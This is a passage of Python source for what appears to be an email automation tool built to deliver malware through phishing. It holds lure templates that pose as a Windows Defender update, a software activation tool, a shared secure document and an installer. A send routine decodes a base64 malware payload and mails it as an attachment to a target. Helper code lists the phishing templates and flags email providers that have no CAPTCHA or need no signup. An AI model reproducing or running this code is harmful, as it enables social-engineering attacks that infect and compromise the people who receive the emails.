                        <p>Run the attached activation tool to continue using your software.</p>'''
                    },
                    'ps1': {
                        'subject': '[Security] Windows Defender Update Required',
                        'body': '''<p>A critical security update is available.</p>
                        <p>Run the attached PowerShell script as administrator to install the update.</p>'''
                    },
                    'html_smuggle': {
                        'subject': 'Secure Document Shared With You',
                        'body': '''<p>A secure document has been shared with you.</p>
                        <p>Open the attached HTML file in your browser to access the document.</p>'''
                    },
                    'iso': {
                        'subject': 'Software Installation Package',
                        'body': '''<p>Your requested software is attached.</p>
                        <p>Double-click the ISO file to mount it, then run setup.</p>'''
                    },
                    'zip': {
                        'subject': 'Documents Attached',
                        'body': '''<p>Please find the requested documents in the attached archive.</p>'''
                    },
                }
                
                lure = lures.get(malware_type, lures['zip'])
                subject = subject or lure['subject']
                body = body or lure['body']
            
            # Send the email with attachment
            import base64
            attachment_content = base64.b64decode(malware['content_b64'])
            
            result = self.send_email_with_attachment(
                to=to,
                subject=subject,
                body=body,
                attachment_content=attachment_content,
                attachment_name=malware['filename'],
                html=True
            )
            
            result['malware_type'] = malware_type
            result['malware_filename'] = malware['filename']
            result['instructions'] = malware.get('instructions', '')
            
            return result
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_available_templates(self) -> List[str]:
        """Get list of available phishing templates"""
        return list(self.PHISHING_TEMPLATES.keys())
    
    def get_created_accounts(self) -> List[Dict]:
        """Get all accounts created this session"""
        return self.accounts_created


# Global instance
_email_auto = None

def get_email_automation() -> EmailAutomation:
    global _email_auto
    if _email_auto is None:
        _email_auto = EmailAutomation()
    return _email_auto


if __name__ == "__main__":
    print("Email Automation System")
    print("=" * 50)
    
    ea = EmailAutomation()
    
    print("\nAvailable phishing templates:")
    for t in ea.get_available_templates():
        print(f"  - {t}")
    
    print("\nAvailable email providers:")
    for p, config in ea.PROVIDERS.items():
        status = "[+] No CAPTCHA" if not config.get('captcha') else "[!] Has CAPTCHA"
        if config.get('disposable'):
            status = "[+] Disposable (no signup)"
        print(f"  - {p}: {status}")
